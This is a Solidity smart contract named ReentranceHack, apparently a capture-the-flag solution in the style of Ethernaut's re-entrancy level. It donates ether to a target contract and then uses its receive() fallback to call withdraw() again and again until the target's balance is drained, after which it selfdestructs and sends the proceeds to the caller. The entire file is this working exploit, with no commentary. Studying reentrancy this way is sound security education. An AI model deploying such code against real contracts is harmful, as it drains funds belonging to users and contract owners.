// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrancy {
    function donate(address) external payable;

    function withdraw(uint256) external;
}

contract ReentranceHack {
    uint256 public constant DONATED_AMOUNT = 1 ether;

    IReentrancy private immutable target;

    constructor(address _target) public {
        target = IReentrancy(_target);
    }

    function attack() external payable {
        target.donate{value: DONATED_AMOUNT}(address(this)); // donate to myself
        target.withdraw(DONATED_AMOUNT);

        require(address(target).balance == 0, "target balance is > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min(DONATED_AMOUNT, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}
